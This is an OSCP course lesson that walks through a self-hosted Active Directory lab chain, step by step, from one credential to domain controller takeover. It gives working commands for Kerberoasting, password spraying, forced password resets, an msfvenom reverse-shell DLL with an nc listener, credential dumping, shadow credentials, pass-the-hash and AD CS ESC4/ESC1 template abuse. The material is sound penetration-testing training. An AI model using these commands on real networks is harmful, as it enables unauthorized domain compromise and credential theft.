

  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 41 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_09

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/545484)[About this chain](https://hackerblueprint.com/labs#chain-09)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2009%3A%20Bloodhunt)

Tags

AD EnumerationPort ScanningPassword ReuseLDAP EnumerationWeb EnumerationSMB EnumerationKerberoastingPassword Cracking

PreviousCompletedNext: Chain 10: ReplicantContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 09: Bloodhunt

Step 1 of 18

Close

0:00 / 1:46:45

Auto

1

Sweep the subnet and confirm the domain

BackNext step

Your lab addressesTarget IPDC IPYour IP

1. 1Sweep the subnet and confirm the domain_0:00_
    
    The chain begins with a single credential set, bthompson:Iceman#8777. The first job is to find every machine in the lab and confirm they are all part of the same Active Directory domain, because a chain means hosts that trust each other, not random boxes that share a subnet.
    
    Running `ip route` shows which network your VPN or lab interface is attached to, which tells you the range to scan. A `netexec smb` sweep of that range lists the reachable Windows hosts and prints each one's domain. Seeing `hackerblueprint.local` on every host confirms this is one domain, so there is no network pivoting to worry about, only moving between hosts you can already reach.
    
    ```
    ip route
    ```
    
    Copy
    
    Shows the networks your machine is connected to so you can read off the lab subnet to scan. Run this on your Kali machine.
    
    ```
    netexec smb TARGET_IP/24
    ```
    
    Copy
    
    Sweeps the whole subnet over SMB and prints each host's name and domain. Swap TARGET_IP/24 for the range `ip route` showed you.
    
    ```
    netexec smb -iL ips.txt -u bthompson -p 'Iceman#8777'
    ```
    
    Copy
    
    Tries the starting credentials against every host in the file `ips.txt`. `-iL` reads targets from a file, `-u` and `-p` give the user and password. A `[+]` means the login is valid on that host.
    
    **Tip**Save the discovered addresses into a file (ips.txt). Nearly every tool from here on takes `-iL ips.txt`, so you only type the list once.
    
2. 2Full port scan and quick shell checks_2:05_
    
    A full TCP scan takes time, so the presenter starts it and does useful work while it runs. The scan covers all 65535 ports with default scripts and version detection, which later identifies the domain controller and the web servers.
    
    While nmap runs, the fastest thing to try is whether the current user already has a shell anywhere. netexec checks WinRM, RDP and WMI in turn. The credentials are valid for RDP and SMB but give no shell yet, which is normal: valid login does not mean remote command execution. The point is to rule the easy wins out before spending time on enumeration.
    
    ```
    nmap -p- -sC -sV -iL ips.txt
    ```
    
    Copy
    
    Scans all TCP ports on every host in the list. `-p-` is all 65535 ports, `-sC` runs the default scripts, `-sV` fingerprints each service's version.
    
    ```
    netexec winrm -iL ips.txt -u bthompson -p 'Iceman#8777'
    ```
    
    Copy
    
    Checks whether the credentials give a WinRM (remote PowerShell) shell on any host. `Pwn3d!` in the output would mean a shell is available.
    
    ```
    netexec rdp -iL ips.txt -u bthompson -p 'Iceman#8777'
    ```
    
    Copy
    
    Checks RDP access with the same credentials. Valid here, but a valid RDP login still needs the user to be allowed an interactive desktop.
    
    ```
    netexec wmi -iL ips.txt -u bthompson -p 'Iceman#8777'
    ```
    
    Copy
    
    Checks WMI execution. WMI rarely hands you a shell directly but is worth ruling out while the scan runs.
    
    **Tip**Keep a short list in your notes of which protocols you have tried (SMB, WinRM, RDP, WMI) so you never repeat a check or forget one.
    
3. 3Collect BloodHound data over LDAP_4:52_
    
    BloodHound maps the domain's users, groups and permissions into a graph, which is the quickest way to find attack paths like a user who can reset another user's password. While the long scan runs, the presenter gathers that data with the Python collector.
    
    The collector talks to the domain controller over LDAP, so it needs the DC's address as both the target and the DNS server, plus a valid credential. Once it finishes it writes several JSON files, which get zipped and imported into the BloodHound GUI for analysis.
    
    ```
    bloodhound-python -d hackerblueprint.local -u bthompson -p 'Iceman#8777' -ns DC_IP -c all
    ```
    
    Copy
    
    Collects all BloodHound data from the domain. `-d` is the domain, `-ns` is the DNS server (the DC), `-c all` runs every collection method. Replace DC_IP with the domain controller's address.
    
    **Tip**Point `-ns` at the domain controller. If name resolution fails, nothing collects, because the collector resolves host names through that DNS server.
    
4. 4Read the scan and map the hosts_8:16_
    
    With the scan finished, the presenter reads it host by host. The domain controller gives itself away: port 88 (Kerberos) is the clearest sign, backed up by SMB, DNS and LDAP and a hostname containing DC. This host is DC01.hackerblueprint.local, and its name is added to `/etc/hosts` so tools can reach it by name.
    
    The two client hosts show the usual RDP, SMB and WinRM, plus a web server (IIS 10) on each. The presenter marks the non-default web port as the only thing worth a second look and confirms there is no direct shell on the DC itself. The takeaway is to turn a wall of nmap output into a short map: which host is the DC, which are clients, and what is unusual on each.
    
    **Tip**Add the DC and its name to `/etc/hosts`. Kerberos and certificate tools often fail on a bare IP because they expect the full host name.
    
5. 5Enumerate the web servers and SMB shares_11:52_
    
    The IIS sites turn out to be default installs. The presenter fuzzes directories without recursion and filters out noise like CSS, then checks `sitemap.xml`, `robots.txt` and page comments by hand. Nothing stands out, and on an IIS server you would fuzz for `.asp` and `.aspx` files rather than `.php`. A dead web server still teaches you where not to spend time.
    
    SMB is more productive. Spidering the shares shows the usual default shares (NETLOGON, SYSVOL) are empty, but one host exposes a non-default share called `IT Files` that the current user can read. It holds nothing useful this time, but finding and checking every non-default share is the habit that matters.
    
    ```
    netexec smb -iL ips.txt -u bthompson -p 'Iceman#8777' --shares
    ```
    
    Copy
    
    Lists the SMB shares on each host and your access level. Look for shares that are not the Windows defaults, and for READ or WRITE on them.
    
    ```
    netexec smb -iL ips.txt -u bthompson -p 'Iceman#8777' -M spider_plus
    ```
    
    Copy
    
    Crawls every readable share and records the files found. The `spider_plus` module skips default shares and noise so you can review what is left.
    
    **Tip**Default shares (IPC$, PRINT$, NETLOGON, SYSVOL) are almost always noise. A share with a custom name like `IT Files` is where the lab designer hides things, so open it first.
    
6. 6Enumerate domain users and descriptions_18:05_
    
    Every user account is a potential foothold, and the description field is a classic place for a lazy admin to leave a password or a hint. The presenter pulls the full user list from the domain controller over LDAP and then prints it without filtering so the description fields show.
    
    Here the descriptions only state roles (monitoring service account, help desk) and give nothing away, which is a normal result. You still check, because when a description does hold a password it saves the whole chain. The user list itself feeds the later Kerberoast, spray and credential-hunt steps.
    
    ```
    netexec ldap DC_IP -u bthompson -p 'Iceman#8777' --users
    ```
    
    Copy
    
    Lists every domain user and shows the description field for each. Scan the descriptions for passwords, hints or service account notes. Run against the DC.
    
    **Tip**Write the usernames to a file now. You will spray them, Kerberoast against them and grep for them on hosts later.
    
7. 7Find the Kerberoast target and the ACL edge_22:16_
    
    With bthompson marked as owned in BloodHound, the pre-built Cypher queries do the heavy lifting. The Kerberoastable users query returns one account, service_web, which means it has a service principal name and can be Kerberoasted. Any domain user can request its ticket and crack it offline.
    
    The shortest path from owned objects reveals a second lead: bthompson has ForceChangePassword over jmiller. The arrow points from bthompson to jmiller, meaning you can reset jmiller's password without knowing the old one. Two clear routes now exist, and the presenter decides to pursue both.
    
    **Tip**Read the direction of the BloodHound arrow carefully. ForceChangePassword only works in the direction the edge points, from the account you control to the account you can reset.
    
8. 8Kerberoast service_web and crack it_24:34_
    
    Kerberoasting asks the domain controller for a service ticket (TGS) for an account that has a service principal name, then cracks the ticket offline to recover that account's password. It needs valid domain credentials, which you already have as bthompson.
    
    The request returns a hash for service_web, saved to a file. You then crack it with a wordlist. This one cracks to the password `spice`, giving a second account to work with. Cracking happens on your Kali machine and never touches the target, so it is safe to leave running in the background.
    
    ```
    netexec ldap DC_IP -u bthompson -p 'Iceman#8777' --kerberoasting kerberoast.txt
    ```
    
    Copy
    
    Requests TGS tickets for all Kerberoastable accounts and writes the crackable hashes to `kerberoast.txt`. Needs valid credentials, which bthompson provides.
    
    ```
    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
    ```
    
    Copy
    
    Cracks the Kerberoast hash offline. `-m 13100` is the mode for a Kerberos TGS-REP hash, and rockyou.txt is the wordlist to try.
    
    **Tip**A Kerberoastable account only needs one check for the whole domain. Unlike certificate checks, you do not repeat Kerberoasting per user.
    
9. 9Abuse ForceChangePassword on jmiller_25:50_
    
    The ForceChangePassword edge means bthompson can set a new password for jmiller. The presenter uses samba-tool to do it remotely, supplying the domain, the controlling account (bthompson) and the domain controller. After one syntax fix the reset succeeds and jmiller's password is now whatever you set.
    
    This is ACL abuse: you did not crack or steal jmiller's password, you overwrote it using a permission you were granted. You now control a third account, which widens the attack surface again.
    
    ```
    samba-tool user setpassword jmiller --newpassword='Newpassword123!' -H ldap://DC_IP -U 'bthompson%Iceman#8777'
    ```
    
    Copy
    
    Resets jmiller's password to one you choose. `-H` points at the DC over LDAP, `-U` is the account doing the reset in user%password form. Set the new password to any value you will remember.
    
    **Tip**Resetting a password is loud and changes the account for everyone. In a real engagement you would record the original and note the change; in the lab it is the intended path.
    
10. 10Spray the credentials and get RDP on client1_31:26_
    
    You now hold three accounts: bthompson, service_web and jmiller. Before anything clever, you spray each one across every protocol on every host to see where any of them gives a shell. There is no password reuse, so each account only logs in as itself, but their access differs.
    
    Spraying RDP shows jmiller can log in interactively on client1. The presenter connects with xfreerdp (Remmina also works) and lands a desktop session. The first foothold shell on a host is a milestone: it moves you from remote enumeration to working on the machine itself.
    
    ```
    netexec smb -iL ips.txt -u users.txt -p passwords.txt --continue-on-success
    ```
    
    Copy
    
    Sprays every username against every password across all hosts. `--continue-on-success` keeps going after the first hit so you see every valid pair.
    
    ```
    xfreerdp /u:jmiller /p:'Newpassword123!' /v:TARGET_IP
    ```
    
    Copy
    
    Opens an RDP session as jmiller on client1. `/u` is the user, `/p` the password you set, `/v` the target host. Use the password from the reset step.
    
    **Tip**Spray SMB first. netexec tells you which host each account is a local admin on (Pwn3d!), which often points you straight at a usable shell.
    
11. 11Check every user for AD CS vulnerabilities_36:45_
    
    AD CS (the certificate service) misconfigurations can hand you the domain in one step, so it is always worth checking. certipy find enumerates the certificate authority and reports which templates a given user can abuse (the ESC findings).
    
    The presenter runs it for jmiller, service_web and bthompson. A CA exists on the DC, but none of these users can abuse any template yet, so there is no certificate path at this stage. The important habit: unlike Kerberoasting, you must repeat this check for every new user, because certificate rights differ per account. You will come back to this once you own more users.
    
    ```
    certipy find -u jmiller@hackerblueprint.local -p 'Newpassword123!' -dc-ip DC_IP -vulnerable -stdout
    ```
    
    Copy
    
    Enumerates the certificate authority and lists templates this user can abuse. `-vulnerable` shows only the exploitable ones, `-stdout` prints to the screen. Repeat per user.
    
    **Tip**Keep a small table of which users you have checked with certipy. It is easy to forget a newly obtained account, and that account is often the one that is vulnerable.
    
12. 12Escalate on client1 via SeManageVolumePrivilege_41:44_
    
    On the RDP shell, `whoami /priv` lists the token privileges. Most are default, but jmiller holds `SeManageVolumePrivilege`, which is abusable: it lets you grant full control over the whole `C:\` drive. With write access to `C:\`, you can overwrite a DLL that a SYSTEM service loads and have your own code run as SYSTEM.
    
    The presenter follows the known technique: run the permission-granting exploit, build a malicious `PrintConfig.dll` payload, drop it where the privileged service loads it, and trigger it. A listener on Kali catches the SYSTEM shell. Landing in `System32` as `NT AUTHORITY\SYSTEM` confirms full control of client1.
    
    ```
    whoami /priv
    ```
    
    Copy
    
    Lists the privileges on your current token. SeManageVolumePrivilege, SeImpersonatePrivilege and SeBackupPrivilege are the ones worth exploiting if you see them enabled.
    
    ```
    whoami /groups
    ```
    
    Copy
    
    Shows the groups your token belongs to, which tells you the integrity level and whether you are already in a privileged local group.
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f dll -o PrintConfig.dll
    ```
    
    Copy
    
    Builds the malicious DLL that replaces the one the SYSTEM service loads. LHOST is your Kali VPN address, LPORT is a port you choose, `-f dll` sets the output format.
    
    ```
    nc -lvnp PORT
    ```
    
    Copy
    
    Starts a listener on your Kali machine to catch the SYSTEM reverse shell when the planted DLL runs. Use the same PORT you built the payload with.
    
    **Tip**After you gain SYSTEM, run PrivescCheck or winPEAS anyway to see what it would have flagged. Learning to recognise an abusable privilege by eye is faster than waiting for a script.
    
13. 13Dump cached credentials and recover dpatch_49:08_
    
    As SYSTEM on client1, the presenter first adds jmiller to the local Administrators group for persistence, then dumps credentials. secretsdump pulls the local SAM hashes and the cached domain logons (MS Cache v2, the hashes Windows stores so domain users can log in offline).
    
    The dump reveals a new account that has logged in here, dpatch, as a cached hash. Cached hashes cannot be used for pass-the-hash, so they must be cracked. John identifies the format as mscash2 and recovers the password, giving a fourth account. The earlier jmiller hash does not crack, which makes sense, because its password was the one you reset through BloodHound rather than the original.
    
    ```
    net localgroup Administrators jmiller /add
    ```
    
    Copy
    
    Adds jmiller to the local Administrators group on client1 for persistence. Run this in the SYSTEM shell on the host.
    
    ```
    impacket-secretsdump jmiller:'Newpassword123!'@TARGET_IP
    ```
    
    Copy
    
    Dumps the local SAM hashes and cached domain credentials from client1. The cached entries are MS Cache v2 hashes for users who have logged in here.
    
    ```
    john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt dpatch.hash
    ```
    
    Copy
    
    Cracks the cached MS Cache v2 hash offline. `--format=mscash2` matches the Windows domain cache format, which cannot be used for pass-the-hash and must be cracked.
    
    **Tip**MS Cache v2 (mscash2) hashes are slow to crack and cannot be passed. If one will not fall to rockyou.txt, note it and move on to other leads rather than waiting on it.
    
14. 14Pivot to nwilliams with shadow credentials_1:00:13_
    
    Spraying dpatch across the hosts gives another RDP session on client1, but that host is already owned, so the value of dpatch is in its permissions. Adding dpatch to BloodHound shows it has GenericWrite over nwilliams, an account not yet compromised.
    
    GenericWrite over a user lets you add a shadow credential (a Key Credential), which Certipy can turn into that user's NT hash in one step. The presenter runs certipy shadow auto against nwilliams using dpatch. The result is nwilliams' NT hash, which is a real NTLM hash and can be used directly for pass-the-hash without cracking.
    
    ```
    certipy shadow auto -u dpatch@hackerblueprint.local -p 'DPATCH_PASSWORD' -account nwilliams -dc-ip DC_IP
    ```
    
    Copy
    
    Abuses GenericWrite over nwilliams by adding a shadow credential, authenticating with it and printing nwilliams' NT hash. `-account` is the victim, DPATCH_PASSWORD is the password you cracked for dpatch.
    
    **Tip**A shadow credential is quieter than a password reset and does not lock the real user out, so prefer it when the BloodHound abuse tab offers both for a GenericWrite edge.
    
15. 15Pass-the-hash onto client2_1:09:40_
    
    With nwilliams' NT hash you spray again, this time with the hash instead of a password. netexec shows nwilliams is a local admin on client2, a host you had not touched. It is not an admin on the DC, so this is lateral movement, not the end.
    
    To be sure of full file access for the next step, the presenter upgrades to SYSTEM on client2 with impacket-psexec (evil-winrm also gives a shell). A quick credential dump here only returns hashes you already have, so the credentials you need must be sitting in a file on disk rather than in the SAM.
    
    ```
    netexec smb -iL ips.txt -u nwilliams -H NWILLIAMS_HASH
    ```
    
    Copy
    
    Sprays nwilliams' NT hash across the hosts using pass-the-hash. `-H` takes the NT hash in place of a password. `Pwn3d!` on client2 means local admin there.
    
    ```
    impacket-psexec nwilliams@TARGET_IP -hashes :NWILLIAMS_HASH
    ```
    
    Copy
    
    Gets a SYSTEM shell on client2 via pass-the-hash. The hash goes after the colon in `-hashes :NThash` with the LM part left blank. Point TARGET_IP at client2.
    
    ```
    evil-winrm -i TARGET_IP -u nwilliams -H NWILLIAMS_HASH
    ```
    
    Copy
    
    Alternative shell on client2 over WinRM using the hash. `-H` passes the NT hash. Useful when psexec is noisy or blocked.
    
    **Tip**An NT (NTLM) hash can be passed as-is; an MS Cache v2 hash cannot. Keep the two straight so you do not waste time trying to pass a hash that only cracks.
    
16. 16Hunt the host and find service_config_1:16:06_
    
    No ACL or certificate path leads off client2, so the remaining move is to search the disk for credentials left behind. The presenter runs a recursive search for likely credential files and filters out noise (inetpub logs, AppData, OneDrive, VMware) pass after pass until the output is readable. This is slow manual work, and the filtering is where the skill is: cut too broadly and you hide the file you want.
    
    The win comes from PowerShell console history. Reading `ConsoleHost_history.txt` for the current user shows a `ConvertTo-SecureString` command with a cleartext password for service_config. That is a fresh credential set, found in a place automated tools often miss.
    
    ```
    Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern (Get-Content users.txt)
    ```
    
    Copy
    
    Searches the whole drive for files whose contents mention any known username. Narrow the file types and pipe to more filters to cut the noise down each pass.
    
    ```
    type C:\Users\nwilliams\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
    
    Copy
    
    Prints the saved PowerShell command history for the user. Admins often leave passwords here in ConvertTo-SecureString or cmdlet arguments. Check this path for every user profile.
    
    **Tip**Always check PowerShell history (ConsoleHost_history.txt) under every user profile, not only the one you landed as. A different profile may hold history that the active user's has had cleaned out.
    
17. 17Abuse ESC4 to make the template ESC1_1:35:09_
    
    service_config is a new account, so it gets the full round of checks. Sprayed across protocols it gives no shell, but certipy find reports it can perform ESC4: it has write permission over a certificate template object. ESC4 is template hijacking, where you edit a template you are allowed to modify and weaken its settings.
    
    The presenter uses certipy template to rewrite the vulnerable template into an ESC1-style configuration (one that lets the requester choose any subject). Certipy backs up the original settings first. Re-running the find confirms the template now reports as ESC1, the most direct certificate path to abuse.
    
    ```
    certipy find -u service_config@hackerblueprint.local -p 'SERVICE_CONFIG_PASSWORD' -dc-ip DC_IP -vulnerable -stdout
    ```
    
    Copy
    
    Checks the new user against the CA and reports ESC4 write rights over a template. Use the password you found in the PowerShell history for service_config.
    
    ```
    certipy template -u service_config@hackerblueprint.local -p 'SERVICE_CONFIG_PASSWORD' -template TEMPLATE_NAME -dc-ip DC_IP
    ```
    
    Copy
    
    Rewrites the template you can modify into an ESC1-vulnerable one and saves the original configuration for restoring later. TEMPLATE_NAME is the remote-access template from the find output.
    
    **Tip**certipy saves the original template configuration when it modifies it. Keep that backup; restoring it is how you clean up after the attack in a real engagement.
    
18. 18Request the Administrator cert and own the DC_1:43:23_
    
    An ESC1 template lets the requester set the certificate's subject to any account, so the presenter requests a certificate as administrator@hackerblueprint.local. certipy returns an administrator.pfx, a certificate that proves you are the Administrator.
    
    certipy auth then uses that PFX to authenticate and retrieve the Administrator NTLM hash. That is a real NT hash, so impacket-psexec with pass-the-hash against the domain controller gives `NT AUTHORITY\SYSTEM` on the DC, completing the domain compromise. A final secretsdump dumps every account hash in the domain, and because those are NTLM hashes they can be used to authenticate, unlike the cached hashes from earlier.
    
    ```
    certipy req -u service_config@hackerblueprint.local -p 'SERVICE_CONFIG_PASSWORD' -dc-ip DC_IP -ca hackerblueprint-CA -template TEMPLATE_NAME -upn administrator@hackerblueprint.local
    ```
    
    Copy
    
    Requests a certificate on the now-ESC1 template, setting the subject to Administrator. `-ca` names the certificate authority, `-upn` is the account you impersonate. Returns administrator.pfx.
    
    ```
    certipy auth -pfx administrator.pfx -dc-ip DC_IP
    ```
    
    Copy
    
    Uses the issued certificate to authenticate as Administrator and prints the account's NTLM hash. No password needed; the certificate is the proof of identity.
    
    ```
    impacket-psexec administrator@DC_IP -hashes :ADMIN_HASH
    ```
    
    Copy
    
    Logs in to the domain controller as Administrator by pass-the-hash and gives a SYSTEM shell. The NT hash goes after the colon with the LM part blank.
    
    ```
    impacket-secretsdump administrator@DC_IP -hashes :ADMIN_HASH
    ```
    
    Copy
    
    Dumps every domain account's NTLM hash from the DC. These are NTLM hashes, so they can be reused for authentication across the domain.
    
    **Tip**ESC1 works because the template allows the enrollee to supply the subject. Setting `-upn administrator@domain` is what turns a normal certificate request into a domain takeover.
